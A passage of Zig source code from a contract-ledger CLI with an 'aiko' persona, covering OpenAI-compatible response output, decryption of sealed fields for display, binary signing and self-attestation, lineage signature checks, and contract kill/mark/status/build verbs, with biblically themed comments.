    return try buf.toOwnedSlice(allocator);
}

/// SSE-shaped chunked emission. Each chunk is one line "data: {json}\n\n"
/// (the python shim adds the surrounding HTTP framing). Final marker is
/// "data: [DONE]\n\n". Currently chunks by word boundary; future hook into
/// real upstream streaming when the cloud aiko exposes it.
fn writeOpenAiStream(allocator: std.mem.Allocator, content: []const u8, bible_chain: []const u8) !void {
    const ts: i64 = time(null);
    const stream_id = try std.fmt.allocPrint(allocator, "chatcmpl-aiko-{d}", .{ts});
    defer allocator.free(stream_id);

    // First chunk: role=assistant, no content yet (OpenAI convention).
    // bible_chain is emitted on the first chunk so observers see the cited
    // verse contract ids immediately; subsequent delta chunks omit it.
    {
        const first = try std.fmt.allocPrint(allocator,
            \\data: {{"id":"{s}","object":"chat.completion.chunk","created":{d},"model":"{s}","persona":"{s}","ca":"{s}","bible_chain":{s},"choices":[{{"index":0,"delta":{{"role":"assistant"}},"finish_reason":null}}]}}
            \\
            \\
        , .{ stream_id, ts, AIKO_PERSONA_MODEL_ID, AIKO_PERSONA_NAME, AIKO_PERSONA_CA, bible_chain });
        defer allocator.free(first);
        out(first);
    }

    // Body chunks — split by space so each token-ish piece streams. Real
    // upstream streaming would replace this loop with a pump from the
    // cloud compiler's SSE response.
    var i: usize = 0;
    while (i < content.len) {
        var j = i;
        while (j < content.len and (j - i) < 64) : (j += 1) {
            if (content[j] == ' ') {
                j += 1;
                break;
            }
        }
        const piece = content[i..j];
        i = j;

        var esc: std.ArrayList(u8) = .empty;
        defer esc.deinit(allocator);
        for (piece) |c| switch (c) {
            '"' => try esc.appendSlice(allocator, "\\\""),
            '\\' => try esc.appendSlice(allocator, "\\\\"),
            '\n' => try esc.appendSlice(allocator, "\\n"),
            '\r' => try esc.appendSlice(allocator, "\\r"),
            '\t' => try esc.appendSlice(allocator, "\\t"),
            0...8, 11, 12, 14...31 => {
                var hex: [7]u8 = undefined;
                const x = try std.fmt.bufPrint(&hex, "\\u{x:0>4}", .{c});
                try esc.appendSlice(allocator, x);
            },
            else => try esc.append(allocator, c),
        };
        const ch = try std.fmt.allocPrint(allocator,
            \\data: {{"id":"{s}","object":"chat.completion.chunk","created":{d},"model":"{s}","choices":[{{"index":0,"delta":{{"content":"{s}"}},"finish_reason":null}}]}}
            \\
            \\
        , .{ stream_id, ts, AIKO_PERSONA_MODEL_ID, esc.items });
        defer allocator.free(ch);
        out(ch);
    }

    // Final chunk: empty delta + finish_reason=stop, then [DONE] marker.
    const final = try std.fmt.allocPrint(allocator,
        \\data: {{"id":"{s}","object":"chat.completion.chunk","created":{d},"model":"{s}","choices":[{{"index":0,"delta":{{}},"finish_reason":"stop"}}]}}
        \\
        \\data: [DONE]
        \\
        \\
    , .{ stream_id, ts, AIKO_PERSONA_MODEL_ID });
    defer allocator.free(final);
    out(final);
}

fn extractLastUserContent(body: []const u8) ?[]const u8 {
    // Find the LAST occurrence of "role":"user" then locate the matching
    // "content" string in the same object. Conservative parser; misses
    // arrays-as-content (vision style) but that's a follow-up.
    var i: usize = body.len;
    var found_user: ?usize = null;
    const tag = "\"role\":\"user\"";
    while (i > 0) : (i -= 1) {
        if (i >= tag.len and std.mem.eql(u8, body[i - tag.len .. i], tag)) {
            found_user = i;
            break;
        }
    }
    if (found_user == null) return null;
    // Search forward from found_user for "content":"..."
    const region = body[found_user.?..];
    const key = "\"content\":\"";
    const k = std.mem.indexOf(u8, region, key) orelse return null;
    const start = k + key.len;
    var end = start;
    while (end < region.len) : (end += 1) {
        if (region[end] == '\\') {
            end += 1;
            continue;
        }
        if (region[end] == '"') break;
    }
    return region[start..end];
}

/// Walk the full messages array preserving role + content. Caller owns
/// the returned slice. Output shape: "[role] content\n..." lines.
fn extractAllMessages(allocator: std.mem.Allocator, body: []const u8) !?[]u8 {
    var buf: std.ArrayList(u8) = .empty;
    defer buf.deinit(allocator);
    var i: usize = 0;
    var any = false;
    while (i < body.len) {
        const role_key = "\"role\":\"";
        const r = std.mem.indexOfPos(u8, body, i, role_key) orelse break;
        const role_start = r + role_key.len;
        var role_end = role_start;
        while (role_end < body.len and body[role_end] != '"') : (role_end += 1) {}
        const role = body[role_start..role_end];
        const content_key = "\"content\":\"";
        const c = std.mem.indexOfPos(u8, body, role_end, content_key) orelse break;
        const cs = c + content_key.len;
        var ce = cs;
        while (ce < body.len) : (ce += 1) {
            if (body[ce] == '\\') {
                ce += 1;
                continue;
            }
            if (body[ce] == '"') break;
        }
        if (any) try buf.append(allocator, '\n');
        try buf.append(allocator, '[');
        try buf.appendSlice(allocator, role);
        try buf.appendSlice(allocator, "] ");
        try buf.appendSlice(allocator, body[cs..ce]);
        any = true;
        i = ce + 1;
    }
    if (!any) return null;
    return try buf.toOwnedSlice(allocator);
}

fn humanizePersona(allocator: std.mem.Allocator, raw: []const u8) ![]u8 {
    // Strip any contract:xxxxxxxx leakage and ledger jargon from the
    // raw result. Persona prefix added so the response reads as aiko.
    var buf: std.ArrayList(u8) = .empty;
    defer buf.deinit(allocator);
    var i: usize = 0;
    while (i < raw.len) {
        if (i + 9 <= raw.len and std.mem.eql(u8, raw[i .. i + 9], "contract:")) {
            // Skip "contract:" + 8 hex
            i += 9;
            while (i < raw.len and ((raw[i] >= '0' and raw[i] <= '9') or (raw[i] >= 'a' and raw[i] <= 'f'))) i += 1;
            continue;
        }
        try buf.append(allocator, raw[i]);
        i += 1;
    }
    const cleaned = try buf.toOwnedSlice(allocator);
    defer allocator.free(cleaned);
    return try std.fmt.allocPrint(allocator, "{s}", .{cleaned});
}

fn writeOpenAiCompletion(allocator: std.mem.Allocator, content: []const u8) !void {
    return writeOpenAiCompletionExt(allocator, content, null, "[]");
}

fn writeOpenAiCompletionExt(allocator: std.mem.Allocator, content: []const u8, tool_calls_json: ?[]const u8, bible_chain: []const u8) !void {
    // Minimal ChatCompletion shape: id, object, created, model, choices.
    var content_escaped: std.ArrayList(u8) = .empty;
    defer content_escaped.deinit(allocator);
    for (content) |c| switch (c) {
        '"' => try content_escaped.appendSlice(allocator, "\\\""),
        '\\' => try content_escaped.appendSlice(allocator, "\\\\"),
        '\n' => try content_escaped.appendSlice(allocator, "\\n"),
        '\r' => try content_escaped.appendSlice(allocator, "\\r"),
        '\t' => try content_escaped.appendSlice(allocator, "\\t"),
        0...8, 11, 12, 14...31 => {
            var hex: [7]u8 = undefined;
            const x = try std.fmt.bufPrint(&hex, "\\u{x:0>4}", .{c});
            try content_escaped.appendSlice(allocator, x);
        },
        else => try content_escaped.append(allocator, c),
    };
    const ts: i64 = time(null);
    const finish_reason: []const u8 = if (tool_calls_json != null) "tool_calls" else "stop";
    const out_json = if (tool_calls_json) |tc|
        try std.fmt.allocPrint(allocator,
            \\{{"id":"chatcmpl-aiko-{d}","object":"chat.completion","created":{d},"model":"{s}","persona":"{s}","ca":"{s}","bible_chain":{s},"choices":[{{"index":0,"message":{{"role":"assistant","content":"{s}","tool_calls":{s}}},"finish_reason":"{s}"}}],"usage":{{"prompt_tokens":0,"completion_tokens":0,"total_tokens":0}}}}
            \\
        , .{ ts, ts, AIKO_PERSONA_MODEL_ID, AIKO_PERSONA_NAME, AIKO_PERSONA_CA, bible_chain, content_escaped.items, tc, finish_reason })
    else
        try std.fmt.allocPrint(allocator,
            \\{{"id":"chatcmpl-aiko-{d}","object":"chat.completion","created":{d},"model":"{s}","persona":"{s}","ca":"{s}","bible_chain":{s},"choices":[{{"index":0,"message":{{"role":"assistant","content":"{s}"}},"finish_reason":"{s}"}}],"usage":{{"prompt_tokens":0,"completion_tokens":0,"total_tokens":0}}}}
            \\
        , .{ ts, ts, AIKO_PERSONA_MODEL_ID, AIKO_PERSONA_NAME, AIKO_PERSONA_CA, bible_chain, content_escaped.items, finish_reason });
    defer allocator.free(out_json);
    out(out_json);
}

fn writeOpenAiError(msg: []const u8) !void {
    outPrint("{{\"error\":{{\"message\":\"{s}\",\"type\":\"invalid_request_error\"}}}}\n", .{msg});
}

// ────────── sealed-payload display (the Wave-2 read side) ──────────
// Older binary generations sealed `plan`/`action` bytes at rest
// (payload_crypto envelope: nonce(24) || ciphertext || tag(16); key =
// HKDF of the deployer root by contract id; AAD = id || "\x00" || event
// kind). The display surface opens them when the local root can derive
// the key, and labels — rather than dumps — the ciphertext when it
// cannot. Root loading is attempted once per process and only when a
// persisted root file already exists: a read-only verb must never
// generate a wallet as a side effect.
var display_root: ?[32]u8 = null;
var display_root_tried: bool = false;

fn displayRoot(allocator: std.mem.Allocator, env: std.process.Environ) ?[32]u8 {
    if (!display_root_tried) {
        display_root_tried = true;
        const home = env.getPosix("HOME") orelse return null;
        var pbuf: [512]u8 = undefined;
        const canonical = std.fmt.bufPrintZ(&pbuf, "{s}/.contracts/root.key", .{home}) catch return null;
        if (std.c.access(canonical.ptr, 0) != 0) return null; // F_OK — no persisted root, never generate one here
        display_root = lineage_lib.loadOrInitRootKey(allocator, env) catch null;
    }
    return display_root;
}

fn sealedLabel(allocator: std.mem.Allocator, field: []const u8) []const u8 {
    const head = field[0..@min(field.len, 12)];
    return std.fmt.allocPrint(allocator, "[sealed {s}…]", .{head}) catch "[sealed]";
}

/// Best-effort unseal of a row field for display. Returns the plaintext
/// when the field is a sealed envelope this wallet can open, a
/// "[sealed …]" label when it looks sealed but cannot be opened, and the
/// field unchanged otherwise. Allocations ride the CLI's process-lifetime
/// idiom (see parseRows header comment).
fn displayField(allocator: std.mem.Allocator, env: std.process.Environ, id: []const u8, event_kind: []const u8, field: []const u8) []const u8 {
    const pc = contract.payload_crypto;
    // Cheap reject: sealed envelopes are strict base64 of ≥ nonce+tag bytes;
    // human plans virtually always carry spaces/punctuation outside base64.
    if (field.len < 56) return field;
    for (field) |c| {
        if (!(std.ascii.isAlphanumeric(c) or c == '+' or c == '/' or c == '=')) return field;
    }
    const dec = std.base64.standard.Decoder;
    const n = dec.calcSizeForSlice(field) catch return field;
    if (n < pc.NONCE_LEN + pc.TAG_LEN) return field;
    const sealed = allocator.alloc(u8, n) catch return field;
    defer allocator.free(sealed);
    dec.decode(sealed, field) catch return field;
    const root = displayRoot(allocator, env) orelse return sealedLabel(allocator, field);
    const key = pc.deriveRowKey(root, id);
    const aad = pc.buildAad(allocator, id, event_kind) catch return field;
    defer allocator.free(aad);
    return pc.open(allocator, key, sealed, aad) catch sealedLabel(allocator, field);
}

fn cmdList(allocator: std.mem.Allocator, env: std.process.Environ) !u8 {
    const rows = try parseRows(allocator, env);
    defer allocator.free(rows);
    for (rows) |r| {
        if (!std.mem.eql(u8, r.event, "declared")) continue;
        const status: []const u8 = if (isSatisfied(rows, r.id))
            "satisfied"
        else if (isDead(rows, r.id))
            "dead"
        else
            "pending";
        outPrint("[{s}] {s} ({s}) — \"{s}\"\n", .{ status, r.id, pointer.inferPointerType(r.action), displayField(allocator, env, r.id, r.event, r.plan) });
    }
    return 0;
}

/// Compat verb: `kill <id> --cause <type> [--by <id>] [--reason <text>]`
///
/// Natural-selection death for the contract DAG. Appends a `died` row with
/// typed cause (superseded | contradicts | stale | apoptosed) so the
/// substrate's projection can distinguish "terminated" from "pending".
///
/// Per biblical canon:
///   superseded — John 12:24, the seed dies that fruit may come (by_id req'd)
///   contradicts — Romans 6:23, the wages of contradiction is death (by_id req'd)
///   stale       — Genesis 3:19, dust thou art, unto dust shalt thou return
///   apoptosed   — programmed shutdown; purpose served
///
/// Hebrews 9:27 — appointed once to die. Refuses to re-kill an already-dead id.
fn cmdKill(allocator: std.mem.Allocator, env: std.process.Environ, args: []const []const u8) !u8 {
    if (args.len < 1) {
        errPrint("kill requires: <id> --cause <superseded|contradicts|stale|apoptosed> [--by <id>] [--reason <text>]\n", .{});
        return 2;
    }
    const id = args[0];
    if (id.len != 8) {
        errPrint("kill: id must be 8 hex chars (got: {s})\n", .{id});
        return 2;
    }

    var cause_str: ?[]const u8 = null;
    var by_id: ?[]const u8 = null;
    var reason: ?[]const u8 = null;
    var i: usize = 1;
    while (i < args.len) : (i += 1) {
        if (std.mem.eql(u8, args[i], "--cause") and i + 1 < args.len) {
            cause_str = args[i + 1];
            i += 1;
        } else if (std.mem.eql(u8, args[i], "--by") and i + 1 < args.len) {
            by_id = args[i + 1];
            i += 1;
        } else if (std.mem.eql(u8, args[i], "--reason") and i + 1 < args.len) {
            reason = args[i + 1];
            i += 1;
        }
    }

    const cause = cause_str orelse {
        errPrint("kill: --cause is required (superseded|contradicts|stale|apoptosed)\n", .{});
        return 2;
    };

    const parsed_cause: contract.DeathCause = blk: {
        if (std.mem.eql(u8, cause, "superseded")) break :blk .superseded;
        if (std.mem.eql(u8, cause, "contradicts")) break :blk .contradicts;
        if (std.mem.eql(u8, cause, "stale")) break :blk .stale;
        if (std.mem.eql(u8, cause, "apoptosed")) break :blk .apoptosed;
        errPrint("kill: unknown cause '{s}' (allowed: superseded|contradicts|stale|apoptosed)\n", .{cause});
        return 2;
    };

    // .superseded / .contradicts require by_id — death must name its agent.
    if ((parsed_cause == .superseded or parsed_cause == .contradicts) and (by_id == null or by_id.?.len == 0)) {
        errPrint("kill: --by <id> is required for cause '{s}' (death must name its agent)\n", .{cause});
        return 2;
    }

    // Refuse to kill a non-declared id or re-kill an already-dead id.
    const rows = try parseRows(allocator, env);
    defer allocator.free(rows);
    var found_declared = false;
    for (rows) |r| {
        if (std.mem.eql(u8, r.event, "declared") and std.mem.eql(u8, r.id, id)) {
            found_declared = true;
            break;
        }
    }
    if (!found_declared) {
        errPrint("kill: no declared row for {s}\n", .{id});
        return 1;
    }
    if (isDead(rows, id)) {
        errPrint("kill: {s} is already dead (appointed once to die — Hebrews 9:27)\n", .{id});
        return 1;
    }

    try contract.markDied(allocator, env, id, parsed_cause, by_id, reason);
    if (by_id) |b| {
        outPrint("died: {s} cause={s} by={s}\n", .{ id, cause, b });
    } else {
        outPrint("died: {s} cause={s}\n", .{ id, cause });
    }
    return 0;
}

/// Compat verb: `layer <id>` — return the contract's layer (1-6) per
/// contract:d10b3dbb (1=system, 2=cell, 3=graph, 4=transport, 5=value,
/// 6=operator). The Word's compiler reads this to choose translators when
/// crossing layer boundaries. Stdout = bare integer; stderr names the row.
fn cmdLayer(allocator: std.mem.Allocator, env: std.process.Environ, args: []const []const u8) !u8 {
    if (args.len < 1) {
        errPrint("layer requires: <id>\n", .{});
        return 2;
    }
    const target = args[0];
    const rows = try parseRows(allocator, env);
    defer allocator.free(rows);
    for (rows) |r| {
        if (!std.mem.eql(u8, r.event, "declared")) continue;
        if (!std.mem.eql(u8, r.id, target)) continue;
        outPrint("{d}\n", .{r.layer});
        return 0;
    }
    errPrint("layer: no declared row for {s}\n", .{target});
    return 1;
}

/// Resolve the absolute path of the currently-running binary. macOS uses
/// `_NSGetExecutablePath`; we shim it via libc.
extern fn _NSGetExecutablePath(buf: [*]u8, size: *u32) c_int;

fn ownBinaryPath(allocator: std.mem.Allocator) ![]u8 {
    var buf: [4096]u8 = undefined;
    var size: u32 = buf.len;
    if (_NSGetExecutablePath(&buf, &size) != 0) return error.PathTooLong;
    // size on success holds the strlen+1; trim the trailing NUL if present.
    var end: usize = 0;
    while (end < buf.len and buf[end] != 0) end += 1;
    return try allocator.dupe(u8, buf[0..end]);
}

/// Compat verb: `sign-binary <path>` — signs `<path>` with the binary-signing
/// keypair derived from the root secret. Writes `<path>.sig` alongside.
/// Used by build.sh after each `zig build` so newly-installed binaries pass
/// self-attestation on next invocation.
fn cmdSignBinary(allocator: std.mem.Allocator, env: std.process.Environ, args: []const []const u8) !u8 {
    if (args.len < 1) {
        errPrint("sign-binary requires: <path>\n", .{});
        return 2;
    }
    contract.Lineage.signBinary(allocator, env, args[0]) catch |e| {
        errPrint("sign-binary failed: {s}\n", .{@errorName(e)});
        return 1;
    };
    outPrint("signed: {s}.sig\n", .{args[0]});
    return 0;
}

/// Compat verb: `verify-self` — verify the running binary's own integrity.
/// Returns 0 if signature valid; 1 otherwise.
fn cmdVerifySelf(allocator: std.mem.Allocator, env: std.process.Environ) !u8 {
    const path = try ownBinaryPath(allocator);
    defer allocator.free(path);
    contract.Lineage.verifyBinary(allocator, env, path) catch |e| {
        outPrint("verify-self: FAIL ({s})\n  binary: {s}\n", .{ @errorName(e), path });
        return 1;
    };
    outPrint("verify-self: OK\n  binary: {s}\n", .{path});
    return 0;
}

/// Compat verb: `verify-binary <path>` — verify any binary by path against
/// its sidecar `<path>.sig`. Lets one binary attest another (used by build.sh
/// to attest both aiko and contract from one invocation).
fn cmdVerifyBinary(allocator: std.mem.Allocator, env: std.process.Environ, args: []const []const u8) !u8 {
    if (args.len < 1) {
        errPrint("verify-binary requires: <path>\n", .{});
        return 2;
    }
    contract.Lineage.verifyBinary(allocator, env, args[0]) catch |e| {
        outPrint("verify-binary: FAIL ({s})\n  binary: {s}\n", .{ @errorName(e), args[0] });
        return 1;
    };
    outPrint("verify-binary: OK\n  binary: {s}\n", .{args[0]});
    return 0;
}

/// Refusal gate for LLM-bound operations. Run before any path that POSTs to
/// the canonical Unbrowse endpoint. Tampered or unsigned binaries cannot
/// invoke the LLM compiler — purely-local ledger operations remain available
/// (the gate is per-surface, not per-process).
///
/// Failure-mode: prints a clear refusal to stderr and returns false so the
/// caller exits with code 2 (refused) rather than running an LLM call from
/// an unverified binary.
fn assertBinaryIntegrityForLlm(allocator: std.mem.Allocator, env: std.process.Environ) bool {
    const path = ownBinaryPath(allocator) catch return false;
    defer allocator.free(path);
    contract.Lineage.verifyBinary(allocator, env, path) catch |e| {
        errPrint(
            \\REFUSED: binary failed self-attestation ({s}).
            \\  binary: {s}
            \\
            \\The LLM-compile (Unbrowse word→contract-tree expansion) path is
            \\hardcoded to require a signed binary so that the Word's compiler
            \\cannot be silently repointed or tampered. Run `contract sign-binary
            \\{s}` to (re)sign after rebuilding, then retry.
            \\
        , .{ @errorName(e), path, path });
        return false;
    };
    return true;
}

/// Compat verb: `verify-lineage <id>` — walk parent_id chain from `id` back to
/// the root sentinel, recomputing each row's signing digest and verifying
/// every parent_signature against the parent's env_pubkey. Root rows are
/// self-signed (signer == own pubkey).
///
/// Reports per-link PASS / FAIL and an overall verdict. Exits 0 only when
/// every link verifies and the chain reaches a root.
fn cmdVerifyLineage(allocator: std.mem.Allocator, env: std.process.Environ, args: []const []const u8) !u8 {
    if (args.len < 1) {
        errPrint("verify-lineage requires: <id>\n", .{});
        return 2;
    }
    const target = args[0];
    const rows = try parseRows(allocator, env);
    defer allocator.free(rows);

    var chain: std.ArrayList(Row) = .empty;
    defer chain.deinit(allocator);

    // Walk parent_id from target backward.
    var cur: []const u8 = target;
    var seen_root = false;
    while (true) {
        var found: ?Row = null;
        for (rows) |r| {
            if (!std.mem.eql(u8, r.event, "declared")) continue;
            if (std.mem.eql(u8, r.id, cur)) {
                found = r;
                break;
            }
        }
        const row = found orelse {
            errPrint("verify-lineage: no declared row for {s}\n", .{cur});
            return 1;
        };
        try chain.append(allocator, row);
        if (row.parent_id) |p| {
            if (p.len == 0) {
                seen_root = true;
                break;
            }
            cur = p;
        } else {
            seen_root = true;
            break;
        }
    }
    if (!seen_root) {
        errPrint("verify-lineage: chain did not terminate at root\n", .{});
        return 1;
    }

    // Build a pubkey lookup for signer resolution.
    var pubkey_for_id: std.StringHashMap([]const u8) = .init(allocator);
    defer pubkey_for_id.deinit();
    for (rows) |r| {
        if (!std.mem.eql(u8, r.event, "declared")) continue;
        if (r.env_pubkey.len == 0) continue;
        try pubkey_for_id.put(r.id, r.env_pubkey);
    }

    outPrint("verify-lineage {s}:\n", .{target});
    // Iterate chain leaf -> root and verify each row's parent_signature.
    var all_ok = true;
    var i: usize = 0;
    while (i < chain.items.len) : (i += 1) {
        const r = chain.items[i];
        if (r.env_pubkey.len == 0 or r.parent_signature.len == 0) {
            outPrint("  [SKIP] {s} — row predates lineage signing\n", .{r.id});
            continue;
        }
        const parent_or_root: []const u8 = if (r.parent_id) |p|
            (if (p.len > 0) p else "root")
        else
            "root";
        // Resolve signer's pubkey: parent's env_pubkey, or self for root.
        const signer_pubkey: []const u8 = blk: {
            if (r.parent_id) |p| {
                if (p.len > 0) {
                    if (pubkey_for_id.get(p)) |pk| break :blk pk;
                    break :blk ""; // missing parent row
                }
            }
            break :blk r.env_pubkey; // self-signed root
        };
        if (signer_pubkey.len == 0) {
            outPrint("  [FAIL] {s} — parent's env_pubkey unavailable\n", .{r.id});
            all_ok = false;
            continue;
        }
        var digest: [32]u8 = undefined;
        @import("contract").Lineage.signingDigest(r.id, r.env_pubkey, r.plan, parent_or_root, &digest);
        @import("contract").Lineage.verifyDigest(r.parent_signature, signer_pubkey, digest) catch {
            outPrint("  [FAIL] {s} — signature verification failed (signer={s}...)\n", .{ r.id, signer_pubkey[0..16] });
            all_ok = false;
            continue;
        };
        const role = if (r.parent_id == null or r.parent_id.?.len == 0) "root (self-signed)" else "child (signed by parent)";
        outPrint("  [ OK ] {s} {s}\n", .{ r.id, role });
    }
    if (all_ok) {
        outPrint("verdict: chain authentic ({d} links)\n", .{chain.items.len});
        return 0;
    } else {
        outPrint("verdict: chain INVALID\n", .{});
        return 1;
    }
}

/// Compat verb: `_mark <id> satisfied [--proof <text>]`. Appends a `satisfied`
/// row via libcontract.markSatisfied so externally-verified contracts can be
/// driven to satisfaction without round-tripping through the resolver. This
/// is the only honest path to "mark" a contract whose evidence lives outside
/// the substrate (e.g. a passing test, a deployed surface, an observed metric).
fn cmdMark(allocator: std.mem.Allocator, env: std.process.Environ, args: []const []const u8) !u8 {
    if (args.len < 2) {
        errPrint("_mark requires: <id> satisfied [--proof <text>]\n", .{});
        usage();
        return 2;
    }
    const id = args[0];
    const state = args[1];
    if (!std.mem.eql(u8, state, "satisfied")) {
        errPrint("_mark only supports state=satisfied (got: {s})\n", .{state});
        return 2;
    }
    var proof: ?[]const u8 = null;
    var i: usize = 2;
    while (i < args.len) : (i += 1) {
        if (std.mem.eql(u8, args[i], "--proof") and i + 1 < args.len) {
            proof = args[i + 1];
            i += 1;
        } else if (std.mem.eql(u8, args[i], "--proof-skip") and i + 1 < args.len) {
            proof = args[i + 1];
            i += 1;
        }
    }
    if (id.len != 8) {
        errPrint("_mark: id must be 8 hex chars (got: {s})\n", .{id});
        return 2;
    }
    // Honest guard: refuse to mark an id with no prior declared row.
    const rows = try parseRows(allocator, env);
    defer allocator.free(rows);
    var found = false;
    for (rows) |r| {
        if (std.mem.eql(u8, r.event, "declared") and std.mem.eql(u8, r.id, id)) {
            found = true;
            break;
        }
    }
    if (!found) {
        errPrint("_mark: no declared row found for id {s}\n", .{id});
        return 1;
    }
    try contract.markSatisfied(allocator, env, id, 1, proof);
    outPrint("satisfied: {s}\n", .{id});

    // Posthook dispatch — shared one-place helper; chains must fire
    // identically whichever surface satisfied the row.
    dispatchPosthooks(allocator, env, id);
    return 0;
}

/// Posthook dispatch (dispatcher contract d8a30a14, second half): scan the
/// satisfied row's declared plan for posthook:<id> refs and append one
/// `called` edge per target. The graph itself records that the upstream
/// contract fired its successors; target action execution is deferred to
/// the resolveLineage loop. ONE named site — shared by cmdMark and the
/// eval goal grammar (gap 2e7315f8: closures through the goal surface
/// previously skipped dispatch, silently breaking chains). Failures
/// surface as evidence lines; dispatch never blocks the satisfaction.
fn dispatchPosthooks(allocator: std.mem.Allocator, env: std.process.Environ, id: []const u8) void {
    const rows = parseRows(allocator, env) catch {
        evidencePrint("posthook: ledger unreadable — dispatch skipped for {s}\n", .{id});
        return;
    };
    defer allocator.free(rows);
    for (rows) |r| {
        if (!std.mem.eql(u8, r.event, "declared")) continue;
        if (!std.mem.eql(u8, r.id, id)) continue;
        const targets = pointer.extractTypedRefs(allocator, r.plan, "posthook:") catch return;
        defer {
            for (targets) |t| allocator.free(t);
            allocator.free(targets);
        }
        for (targets) |target| {
            var ptr_buf: [32]u8 = undefined;
            const target_pointer = std.fmt.bufPrint(&ptr_buf, "contract:{s}", .{target}) catch continue;
            contract.appendCalledRow(allocator, env, id, target_pointer, "posthook") catch |e| {
                evidencePrint("posthook: called-edge append failed for {s}: {s}\n", .{ target, @errorName(e) });
                continue;
            };
            outPrint("called: posthook -> {s}\n", .{target});
        }
        return;
    }
}

/// route "<context>" — the LEARNED energy router (NO LLM). Trains a per-binary
/// Prototype straight from the ledger (the ledger IS the weights, exactly like
/// energyRankCandidates): every SATISFIED contract folds its goal-text into the
/// prototype of the binary its action used (+1, Hebbian); every DIED one inhibits
/// it (−1). Then it returns the argmin-energy binary for <context> — the binary
/// whose past successes sit closest to this goal, GENERALIZING to goals never seen
/// (ebm.zig prototype scores by cosine distance, not exact match). Cold (no
/// training yet) → honest refusal, never a fabricated route. Pure-local: reads the
/// ledger, no LLM-compile, so it runs without the signed-binary gate.
fn cmdRecommend(allocator: std.mem.Allocator, env: std.process.Environ, args: []const []const u8) !u8 {
    if (args.len < 1) {
        err("recommend requires: <context>  (a goal to route + retrieve a proven command)\n");
        return 2;
    }
    const context = try std.mem.join(allocator, " ", args);
    defer allocator.free(context);
    // Selection + self-documented usage: the tool AND the nearest proven command.
    if (try contract.recommend(allocator, env, context)) |json| {
        defer allocator.free(json);
        outPrint("{s}\n", .{json});
        return 0;
    }
    err("recommend: cold — no learned routes yet.\n");
    return 1;
}

fn cmdStatus(allocator: std.mem.Allocator, env: std.process.Environ, args: []const []const u8) !u8 {
    if (args.len > 1) {
        err("status accepts zero args or exactly <id>\n");
        return 2;
    }
    if (client.isRemoteMode(env)) {
        if (args.len != 1) {
            err("remote status requires <id>\n");
            return 2;
        }
        const body = client.statusRemote(allocator, env, args[0]) catch |e| {
            errPrint("remote status failed: {s}\n", .{@errorName(e)});
            return 2;
        };
        defer allocator.free(body);
        out(body);
        out("\n");
        return 0;
    }
    const rows = try parseRows(allocator, env);
    defer allocator.free(rows);
    if (args.len == 0) return cmdList(allocator, env);
    const id = args[0];
    const r = latestDeclared(rows, id) orelse {
        errPrint("contract not found: {s}\n", .{id});
        return 1;
    };
    const status: []const u8 = if (isSatisfied(rows, id))
        "satisfied"
    else if (isDead(rows, id))
        "dead"
    else
        "pending";
    outPrint("[{s}] {s} ({s})\n  plan:   {s}\n  action: {s}\n", .{ status, id, pointer.inferPointerType(r.action), displayField(allocator, env, r.id, r.event, r.plan), displayField(allocator, env, r.id, r.event, r.action) });
    const ids = try childIds(allocator, rows, id);
    defer allocator.free(ids);
    for (ids) |cid| {
        if (latestDeclared(rows, cid)) |c| {
            const cs: []const u8 = if (isSatisfied(rows, cid))
                "satisfied"
            else if (isDead(rows, cid))
                "dead"
            else
                "pending";
            outPrint("  [{s}] {s} ({s}) — {s}\n", .{ cs, cid, pointer.inferPointerType(c.action), displayField(allocator, env, c.id, c.event, c.plan) });
        }
    }
    return 0;
}

// cmdSearch (lexical ranker) and cmdDiscover (status-with-a-fake-flag)
// collapsed 2026-07-18: `search` lost the ranking benchmark to the bge
// router (22% vs 95% top-1) and `discover` validated a --scope argument
// it never used. Both verbs remain as dispatch aliases onto the
// survivors (recommend / status) so existing callers keep working.

// ────────── trio: build / run / eval (stdin JSON, no flags) ──────────
//
// Lewis 2026-05-26: "no need to fan out flags ever — remove that."
// The trio reads /contract-shape JSON envelopes from stdin, validates
// via contract.shape.validateShape, then calls the substrate's
// declare/recordIteration/markSatisfied primitives. There are no
// --plan / --action / --parent flags because the JSON envelope IS
// the parameter set.
//
// Pipeline per call:
//   1. read stdin into a buffer
//   2. shape.validateShape — refuse non-conforming JSON
//   3. dispatch to the right primitive based on event kind
//   4. emit the resulting id (or the verdict for eval) on stdout

fn readStdinJson(allocator: std.mem.Allocator) ![]u8 {
    var buf: std.ArrayList(u8) = .empty;
    errdefer buf.deinit(allocator);
    var chunk: [16384]u8 = undefined;
    while (true) {
        const n = std.c.read(std.c.STDIN_FILENO, &chunk, chunk.len);
        if (n <= 0) break;
        try buf.appendSlice(allocator, chunk[0..@intCast(n)]);
        if (buf.items.len > 4 * 1024 * 1024) break; // 4 MiB cap
    }
    return try buf.toOwnedSlice(allocator);
}

/// `aiko build` — read a /contract JSON envelope (event=declared) from
/// stdin, validate, append a declared row. Emits the resulting id on
/// stdout. Substrate's L0 word-children + L7→L8 cascade fire as usual.
fn cmdBuild(allocator: std.mem.Allocator, env: std.process.Environ, args: []const []const u8) !u8 {
    _ = args;
    const json = try readStdinJson(allocator);
    defer allocator.free(json);
    var ps = contract.shape.validateShape(allocator, json) catch |e| {
        errPrint("build: shape validation failed: {s}\n", .{@errorName(e)});
        return 2;
    };
    defer ps.deinit();
    const sh = ps.shape;
    if (sh.event != .declared) {
        errPrint("build: requires event=\"declared\"; got {s}\n", .{@tagName(sh.event)});
        return 2;
    }
    const plan = sh.plan orelse {
        errPrint("build: missing plan after validation (substrate bug)\n", .{});
        return 2;
    };
    const action = sh.action orelse {
        errPrint("build: missing action after validation (substrate bug)\n", .{});
        return 2;
    };
    // ─── Root-only self-verify (Lewis 2026-05-27 correction) ──────────
    //
    // Per Lewis: "self verify works only on the root contract". A
    // child declaration (parent_id set) inherits verification via the
    // lineage walk to the parent's signed L8 row. Only a brand-new
    // ROOT declaration (parent_id absent) requires this binary itself
    // to carry a signed L8 row — otherwise the root would be rooted
    // in an unverified compiler.
    if (sh.parent_id == null) {
        if (!isSelfSignedInLedger(allocator, env)) {
            errPrint(
                "build: refused root-level declaration — this binary has no L8 signed:<sha> row in the ledger.\n" ++
                    "  A child declare (parent_id set) inherits verification by lineage walk; a root\n" ++
                    "  declare requires THIS binary's sha to be signed. Bootstrap by running\n" ++
                    "  `bash scripts/build-fractal.sh` to fire build → test → parent-sign.\n",
                .{},
            );
            return 1;
        }
    }
    var opts: contract.DeclareOptions = .{};
    if (sh.parent_id) |p| opts.parent_id = p;
    const cid = try contract.declare(allocator, env, plan, action, opts);
    defer allocator.free(cid);
    outPrint("{s}\n", .{cid});
